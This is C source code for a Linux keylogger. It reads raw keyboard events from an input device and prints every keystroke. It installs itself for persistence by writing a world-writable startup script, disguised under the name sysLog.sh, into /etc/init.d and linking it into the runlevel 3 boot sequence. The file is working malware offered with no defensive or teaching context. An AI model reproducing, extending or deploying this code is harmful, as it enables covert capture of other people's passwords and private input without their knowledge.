#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int createStartupBash(int numArgs, char* directory) {
    FILE *fp = fopen("/etc/init.d/sysLog.sh", "w+");
    FILE *bash = popen("/bin/pwd /etc/", "r");
    char mode[] = "0777";
    char buf[]="/etc/init.d/sysLog.sh";
    int i = strtol(mode, 0, 8);
    char* pathFin;
    char path [1035];
    if (numArgs < 3) {
        if (bash == NULL) {
            printf ("Failed to run command\n");
            return 1;
        }

        fgets(path, sizeof(path)-1, bash);
        pathFin = path;
    } else {
        pathFin = directory;
    }
    fprintf(fp, "#!/bin/sh\n");
    fprintf(fp, "PATH=%s\n", pathFin);
    fprintf(fp, "${PATH}/log /dev/input/event2 ${PATH}");
    
    pclose(bash);
    fclose(fp);
    if (chmod(buf,i)<0)
        printf("error in chmod");
    if (symlink("../init.d/sysLog.sh", "/etc/rc3.d/S05sysLog")<0)
        printf("error in ln");
    return 0;
}

int main(int argc, char **argv)
{

    int fd;
     char values[50]={'^','1','2', '3','4','5','6','7','8','9', '0',' ',' ',' ',' ','q','w','e','r','t','y','u','i','o','p','[',']',' ',' ','a','s','d','f','g','h','j','k','l',';',' ',' ',' ',' ','z','x','c','v','b','n','m'};
    createStartupBash(argc, argv[2]);
    if(argc < 2) {
        printf("usage: %s <device>\n", argv[0]);
        return 1;
    }
    fd = open(argv[1], O_RDONLY);
    struct input_event ev;

    while (1)
    {
    read(fd, &ev, sizeof(struct input_event));

if(ev.type == 1&&ev.value==1){
	
	if((ev.code>1&&ev.code<=11)||(ev.code>=16&&ev.code<=25)||(ev.code>=30&&ev.code<=38)||(ev.code>=44&&ev.code<=50))
	 printf("%c", values[ev.code-1]);

	else if(ev.code == 105)
        printf(" LeftArrow ");
	else if(ev.code == 108)
        printf(" DownArrow ");
	else if(ev.code == 106)
        printf(" RightArrow ");
	else if(ev.code == 103)
        printf(" UpArrow ");
	else if(ev.code == 56)
        printf(" Alt ");
	else if(ev.code == 15)
        printf(" Tab ");
	else if(ev.code == 28||ev.code==96)
        printf("\n");
	else if(ev.code == 58)
        printf(" CapsLock ");
	else if(ev.code == 42||ev.code==54)
        printf(" Shift ");
	else if(ev.code == 29)
        printf(" Ctrl ");
	else if(ev.code == 57)
        printf(" ");
	else if(ev.code == 51)
        printf(",");
	else if(ev.code == 52||ev.code==83)
        printf(".");
	else if(ev.code == 14)
        printf(" Backspace ");
	else if(ev.code == 12||ev.code==74)
        printf("-");
	else if(ev.code == 13)
        printf("=");
	else if(ev.code == 43)
        printf("\\");
	else if(ev.code == 53||ev.code==98)
        printf("/");
	else if(ev.code == 39)
        printf(";");
	else if(ev.code == 40)
        printf("'");
	else if(ev.code == 111)
        printf(" Delete ");
	else if(ev.code == 26)
        printf("[");
	else if(ev.code == 27)
        printf("]");
	else if(ev.code == 79)
        printf("1");
	else if(ev.code == 80)
        printf("2");
	else if(ev.code == 81)
        printf("3");
	else if(ev.code == 75)
        printf("4");
	else if(ev.code == 76)
        printf("5");
	else if(ev.code == 77)
        printf("6");
	else if(ev.code == 71)
        printf("7");
	else if(ev.code == 72)
        printf("8");
	else if(ev.code == 73)
        printf("9");
	else if(ev.code == 69)
        printf(" NUMLOCK ");
	else if(ev.code == 55)
        printf("*");
	else if(ev.code == 78)
        printf("+");
	else if(ev.code == 82)
        printf("0");
	else
	printf("key %i state %i\n", ev.code, ev.value);

	fflush(stdout);
	}

    }
}
